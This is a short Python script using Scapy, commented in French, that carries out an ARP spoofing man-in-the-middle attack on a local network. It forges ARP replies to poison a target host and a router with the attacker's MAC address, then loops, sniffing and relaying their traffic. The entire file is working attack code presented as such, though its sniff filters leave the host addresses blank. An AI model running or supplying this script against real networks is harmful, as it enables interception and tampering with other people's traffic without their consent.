from scapy.all import *


#Création des trames pour l'attaque

trametype=Ether(type=0x0806)

#Trame vers la cible

packet=ARP()
packet.hwlen=6                          #Taille en octet @MAC
packet.plen=4                           #Taille en octet @IP
packet.op=2
packet.psrc='192.168.1.1'               #ip de la machine pour laquelle on se fait passer
packet.pdst='192.168.1.138'             #ip cible
packet.hwsrc='00:0c:29:7e:cc:75'        #notre @MAC attaquante 
packet.hwdst='00:0c:29:fe:6e:1b'        #@MAC cible

trame1=trametype/packet

#Trame vers le routeur

packet2=ARP()
packet2.hwlen=6                         #Taille en octet @MAC
packet2.plen=4                          #Taille en octet @IP
packet2.op=2
packet2.psrc='192.168.1.138'            #ip de la cible
packet2.pdst='192.168.1.1'              #ip du routeur
packet2.hwsrc='00:0c:29:7e:cc:75'       #notre @MAC attaquante 
packet2.hwdst='2c:79:d7:be:5b:23'       #@MAC du routeur

trame2=trametype/packet2

#Debut de l'attaque

while True:
    sendp(trame1)
    sendp(trame2)
    retour1=sniff(count=1, filter="host ()")    #ip cible
    retour2=sniff(count=1, filter="host ()")    #ip routeur

    #Après avoir récuperé les réponses on les renvoie aux bons destinataires

    retour1[IP].dst='192.168.1.1'           #ip routeur
    sendp(retour1)
    retour2[IP].dst='192.168.1.138'    #ip cible
    sendp(retour2)